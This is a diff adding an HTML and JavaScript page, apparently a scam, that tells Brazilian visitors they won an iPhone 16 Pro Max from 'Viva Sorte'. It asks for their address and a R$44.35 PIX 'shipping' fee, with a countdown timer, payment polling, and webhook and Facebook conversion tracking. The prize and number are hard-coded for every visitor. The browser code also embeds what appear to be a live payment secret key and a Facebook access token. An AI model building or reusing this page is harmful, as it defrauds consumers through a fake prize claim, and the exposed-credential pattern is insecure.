@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Resgate seu Prêmio - Viva Sorte</title>
+    <link href="css/style.css" rel="stylesheet">
+    <link href="css/header.css" rel="stylesheet">
+    <link href="css/rodape.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+    <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+    <link rel="stylesheet" href="css/bootstrap-icons.min.css">
+    <script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '8957407444350268');
+      fbq('track', 'PageView');
+    </script>
+    <noscript>
+      <img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=8957407444350268&ev=PageView&noscript=1"/>
+    </noscript>
+    <style>
+        .checkout-container {
+            margin: 0 auto;
+            width: 700px;
+            max-width: 100%;
+            padding: 20px;
+        }
+
+        .checkout-box {
+            background-color: #2f4eb5;
+            border-radius: 0.8rem;
+            padding: 30px;
+            margin: 20px 0;
+            text-align: center;
+            color: white;
+            box-shadow: 0px 12px 16px -13px rgba(0, 0, 0, 0.47);
+        }
+
+        .prize-info {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 0.6rem;
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .address-form {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 0.6rem;
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: white;
+            font-weight: 500;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 0.4rem;
+            font-size: 1rem;
+        }
+
+        .shipping-option {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 0.6rem;
+            margin: 10px 0;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            text-align: left;
+            border: 2px solid transparent;
+        }
+
+        .shipping-option:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .shipping-option.selected {
+            border-color: #52b52f;
+            background: rgba(82, 181, 47, 0.2);
+        }
+
+        .shipping-price {
+            float: right;
+            font-weight: bold;
+        }
+
+        .total-box {
+            background-color: #52b52f;
+            padding: 20px;
+            border-radius: 0.6rem;
+            margin: 20px 0;
+            text-align: right;
+        }
+
+        .pay-button {
+            display: inline-block;
+            padding: 15px 30px;
+            background-color: #52b52f;
+            color: white;
+            text-decoration: none;
+            border-radius: 0.6rem;
+            font-weight: 600;
+            font-size: 1.2rem;
+            margin-top: 20px;
+            border: none;
+            width: 100%;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .pay-button:hover {
+            background-color: #0f8400;
+        }
+
+        .pix-qrcode {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .pix-qrcode img {
+            max-width: 200px;
+            margin: 10px auto;
+        }
+
+        .pix-qrcode .copy-button {
+            background-color: white;
+            color: #2f4eb5;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 0.4rem;
+            cursor: pointer;
+            font-weight: 600;
+            margin-top: 10px;
+        }
+
+        .timer {
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+    </style>
+    <script>
+        window.pixelId = "67591726b1d7e085d2700fc8";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <script
+        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+        data-utmify-prevent-subids
+        async
+        defer
+    ></script>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="menu-container">
+                <div class="logo-group">
+                    <img src="images/logo.png" class="logo" alt="Logomarca do Viva Sorte" draggable="false">
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="checkout-container">
+        <div class="checkout-box">
+            <h2>Resgate seu Prêmio</h2>
+            
+            <div class="prize-info">
+                <h3>Seu Prêmio:</h3>
+                <p>iPhone 16 Pro Max 512GB</p>
+                <p>Número Premiado: 1073012</p>
+            </div>
+
+            <div class="address-form">
+                <h3>Endereço de Entrega</h3>
+                <div class="form-group">
+                    <label>CEP</label>
+                    <input type="text" id="cep" maxlength="8" onblur="buscarCep()">
+                </div>
+                <div class="form-group">
+                    <label>Rua</label>
+                    <input type="text" id="rua">
+                </div>
+                <div class="form-group">
+                    <label>Número</label>
+                    <input type="text" id="numero">
+                </div>
+                <div class="form-group">
+                    <label>Complemento</label>
+                    <input type="text" id="complemento">
+                </div>
+                <div class="form-group">
+                    <label>Bairro</label>
+                    <input type="text" id="bairro">
+                </div>
+                <div class="form-group">
+                    <label>Cidade</label>
+                    <input type="text" id="cidade">
+                </div>
+                <div class="form-group">
+                    <label>Estado</label>
+                    <input type="text" id="estado" maxlength="2">
+                </div>
+            </div>
+
+            <div class="shipping-options">
+                <h3>Opções de Envio</h3>
+                <div class="shipping-option selected" onclick="selectShipping(this, 44.35)">
+                    <span>Envio Padrão - Correios</span>
+                    <span class="shipping-price">R$ 44,35</span>
+                </div>
+            </div>
+
+            <div class="total-box">
+                <h3>Total a Pagar</h3>
+                <p class="total-price">R$ 44,35</p>
+            </div>
+
+            <button class="pay-button" onclick="generatePixPayment()">
+                <i class="bi bi-qr-code"></i> Pagar com PIX
+            </button>
+
+            <div class="pix-qrcode">
+                <h3>Escaneie o QR Code</h3>
+                <div id="qrcode-container"></div>
+                <p>Ou copie o código PIX:</p>
+                <div class="pix-code" id="pix-code"></div>
+                <button class="copy-button" onclick="copyPixCode()">Copiar Código</button>
+                <div class="timer">Tempo restante: <span id="timer">10:00</span></div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://unpkg.com/qrcode-generator"></script>
+    <script>
+        const ATIVO_PAY_API = 'https://api.conta.ativopay.com/v1';
+        const SECRET_KEY = 'sk_live_TvXLBxFKtL0XMuXfVsoGy5iZGTdY8BeguAQMCE1ddM';
+        const TRACKING_WEBHOOK = 'https://hook.us1.make.com/7afo5c1sbp3vvzd1hqwwk5pd6n6yxxx9';
+        let selectedShippingPrice = 44.35;
+        let pixCode = '';
+        let paymentId = '';
+        let checkInterval;
+
+        function buscarCep() {
+            const cep = document.getElementById('cep').value.replace(/\D/g, '');
+            if (cep.length === 8) {
+                fetch(`https://viacep.com.br/ws/${cep}/json/`)
+                    .then(response => response.json())
+                    .then(data => {
+                        document.getElementById('rua').value = data.logradouro;
+                        document.getElementById('bairro').value = data.bairro;
+                        document.getElementById('cidade').value = data.localidade;
+                        document.getElementById('estado').value = data.uf;
+                    });
+            }
+        }
+
+        function selectShipping(element, price) {
+            document.querySelectorAll('.shipping-option').forEach(opt => {
+                opt.classList.remove('selected');
+            });
+            element.classList.add('selected');
+            selectedShippingPrice = price;
+            updateTotal();
+        }
+
+        function updateTotal() {
+            document.querySelector('.total-price').textContent = `R$ ${selectedShippingPrice.toFixed(2)}`;
+        }
+
+        async function generatePixPayment() {
+            const addressData = {
+                cep: document.getElementById('cep').value,
+                rua: document.getElementById('rua').value,
+                numero: document.getElementById('numero').value,
+                complemento: document.getElementById('complemento').value,
+                bairro: document.getElementById('bairro').value,
+                cidade: document.getElementById('cidade').value,
+                estado: document.getElementById('estado').value
+            };
+
+            console.log('Dados do endereço:', addressData);
+
+            // Validar campos obrigatórios
+            if (!addressData.cep || !addressData.rua || !addressData.numero || !addressData.bairro || !addressData.cidade || !addressData.estado) {
+                console.error('Campos obrigatórios não preenchidos:', addressData);
+                alert('Por favor, preencha todos os campos obrigatórios do endereço.');
+                return;
+            }
+
+            try {
+                const payloadData = {
+                    amount: parseInt(selectedShippingPrice * 100),
+                    paymentMethod: 'pix',
+                    customer: {
+                        name: 'Cliente Teste',
+                        email: 'cliente@teste.com',
+                        document: {
+                            type: 'cpf',
+                            number: '12345678909'
+                        },
+                        phone: '11999999999'
+                    },
+                    items: [
+                        {
+                            title: 'Frete para entrega do prêmio',
+                            quantity: 1,
+                            unitPrice: parseInt(selectedShippingPrice * 100),
+                            tangible: true
+                        }
+                    ],
+                    pix: {
+                        expiresIn: 900
+                    },
+                    metadata: {
+                        type: 'prize_shipping',
+                        prize_name: 'iPhone 16 Pro Max 512GB',
+                        prize_number: '1073012',
+                        address: addressData
+                    }
+                };
+
+                console.log('Payload da requisição:', JSON.stringify(payloadData, null, 2));
+                console.log('URL da requisição:', `${ATIVO_PAY_API}/transactions`);
+                console.log('Headers:', {
+                    'Authorization': 'Basic ' + btoa(SECRET_KEY + ':x'),
+                    'Content-Type': 'application/json'
+                });
+
+                const response = await fetch(`${ATIVO_PAY_API}/transactions`, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': 'Basic ' + btoa(SECRET_KEY + ':x'),
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payloadData)
+                });
+
+                console.log('Status da resposta:', response.status);
+                console.log('Headers da resposta:', Object.fromEntries(response.headers.entries()));
+
+                const responseData = await response.json();
+                console.log('Dados da resposta:', JSON.stringify(responseData, null, 2));
+
+                if (!response.ok) {
+                    console.error('Erro na resposta:', responseData);
+                    throw new Error(responseData.message || 'Erro ao gerar pagamento');
+                }
+
+                // Mostrar QR Code
+                document.querySelector('.pix-qrcode').style.display = 'block';
+                document.querySelector('.pay-button').style.display = 'none';
+                
+                // Gerar QR Code
+                const qr = qrcode(0, 'L');
+                qr.addData(responseData.pix.qrcode || responseData.pix.code);
+                qr.make();
+                document.getElementById('qrcode-container').innerHTML = qr.createImgTag(4);
+                
+                // Salvar código PIX
+                pixCode = responseData.pix.qrcode || responseData.pix.code;
+                document.getElementById('pix-code').textContent = pixCode;
+                
+                // Salvar ID do pagamento
+                paymentId = responseData.id;
+                console.log('ID do pagamento:', paymentId);
+                
+                // Iniciar timer e verificação de status
+                startTimer();
+                startPaymentCheck();
+
+                // Enviar dados para webhook
+                const trackingPayload = {
+                    payment_id: paymentId,
+                    value: selectedShippingPrice,
+                    prize: {
+                        name: 'iPhone 16 Pro Max 512GB',
+                        number: '1073012'
+                    }
+                };
+                console.log('Enviando tracking:', trackingPayload);
+                trackPayment('generated', trackingPayload);
+
+                // Enviar evento de início de checkout do frete
+                fbq('track', 'InitiateCheckout', {
+                    content_type: 'product',
+                    content_name: 'Frete para Prêmio',
+                    value: selectedShippingPrice,
+                    currency: 'BRL',
+                    contents: [{
+                        id: 'prize-shipping',
+                        quantity: 1,
+                        price: selectedShippingPrice
+                    }]
+                });
+
+            } catch (error) {
+                console.error('Erro detalhado:', error);
+                console.error('Stack trace:', error.stack);
+                alert('Erro ao gerar o pagamento. Por favor, tente novamente.');
+            }
+        }
+
+        function copyPixCode() {
+            navigator.clipboard.writeText(pixCode)
+                .then(() => alert('Código PIX copiado!'))
+                .catch(err => console.error('Erro ao copiar:', err));
+        }
+
+        function startTimer() {
+            let timeLeft = 600; // 10 minutos em segundos
+            const timerDisplay = document.getElementById('timer');
+            
+            const countdown = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    alert('Tempo expirado. Por favor, gere um novo código.');
+                    document.querySelector('.pix-qrcode').style.display = 'none';
+                }
+                
+                timeLeft--;
+            }, 1000);
+        }
+
+        function startPaymentCheck() {
+            if (checkInterval) {
+                clearInterval(checkInterval);
+            }
+
+            checkInterval = setInterval(async () => {
+                try {
+                    console.log('Verificando status do pagamento:', paymentId);
+                    const response = await fetch(`${ATIVO_PAY_API}/transactions/${paymentId}`, {
+                        headers: {
+                            'Authorization': 'Basic ' + btoa(SECRET_KEY + ':x')
+                        }
+                    });
+
+                    console.log('Status da verificação:', response.status);
+                    const data = await response.json();
+                    console.log('Resposta da verificação:', JSON.stringify(data, null, 2));
+
+                    if (!response.ok) {
+                        console.error('Erro na verificação:', data);
+                        throw new Error('Erro ao verificar status');
+                    }
+
+                    console.log('Status do pagamento:', data.status);
+
+                    if (data.status === 'paid') {
+                        console.log('Pagamento confirmado!');
+                        clearInterval(checkInterval);
+                        const trackingPayload = {
+                            payment_id: paymentId,
+                            value: selectedShippingPrice,
+                            prize: {
+                                name: 'iPhone 16 Pro Max 512GB',
+                                number: '1073012'
+                            }
+                        };
+                        console.log('Enviando confirmação:', trackingPayload);
+                        trackPayment('confirmed', trackingPayload);
+                        window.location.href = 'confirmacao-envio.html';
+
+                        // Enviar evento de compra do frete
+                        fbq('track', 'Purchase', {
+                            content_type: 'product',
+                            content_name: 'Frete para Prêmio',
+                            value: selectedShippingPrice,
+                            currency: 'BRL',
+                            contents: [{
+                                id: 'prize-shipping',
+                                quantity: 1,
+                                price: selectedShippingPrice
+                            }]
+                        });
+
+                        // Enviar evento com o token de servidor
+                        fetch('https://graph.facebook.com/v18.0/8957407444350268/events', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                data: [{
+                                    event_name: 'Purchase',
+                                    event_time: Math.floor(Date.now() / 1000),
+                                    action_source: 'website',
+                                    user_data: {
+                                        client_ip_address: '{{client_ip_address}}',
+                                        client_user_agent: navigator.userAgent,
+                                        fbp: document.cookie.match(/_fbp=([^;]+)/) ? document.cookie.match(/_fbp=([^;]+)/)[1] : null,
+                                        fbc: document.cookie.match(/_fbc=([^;]+)/) ? document.cookie.match(/_fbc=([^;]+)/)[1] : null
+                                    },
+                                    custom_data: {
+                                        content_type: 'product',
+                                        content_name: 'Frete para Prêmio',
+                                        value: selectedShippingPrice,
+                                        currency: 'BRL',
+                                        contents: [{
+                                            id: 'prize-shipping',
+                                            quantity: 1,
+                                            price: selectedShippingPrice
+                                        }]
+                                    }
+                                }],
+                                access_token: 'EAAXbxPO0uI4BOyc2af76GwOMqMl2LlTsJf7DCESwTHOg9qIHJzr18ZCjNABX9ZAoQXy4ZA2ZAZBmLCl85aZBwI3X2eRI8S4xVZAttAIdaE2DtprA3g9i6rx1ZCozGkI078esBLdAoA9LpPZCnEXnIheLNZCA8ZB65J7tp2uHOL4HcfcrFrDZC0SBVlxFn5ZCwgZBHUEbVNJwZDZD'
+                            })
+                        })
+                        .then(response => response.json())
+                        .then(data => console.log('Evento de servidor enviado:', data))
+                        .catch(error => console.error('Erro ao enviar evento de servidor:', error));
+                    }
+                } catch (error) {
+                    console.error('Erro na verificação:', error);
+                    console.error('Stack trace:', error.stack);
+                }
+            }, 5000);
+        }
+
+        function trackPayment(status, data) {
+            const trackingData = {
+                event: 'prize_shipping_payment',
+                status: status,
+                ...data,
+                utm_params: JSON.parse(localStorage.getItem('utmParams') || '{}')
+            };
+
+            console.log('Dados do tracking:', JSON.stringify(trackingData, null, 2));
+
+            // Enviar para webhook
+            fetch(TRACKING_WEBHOOK, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(trackingData)
+            })
+            .then(response => response.json())
+            .then(data => console.log('Resposta do webhook:', data))
+            .catch(error => console.error('Erro no webhook:', error));
+        }
+    </script>
+    <script
+        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+        data-utmify-prevent-subids
+        async
+        defer
+    ></script>
+</body>
+</html> 
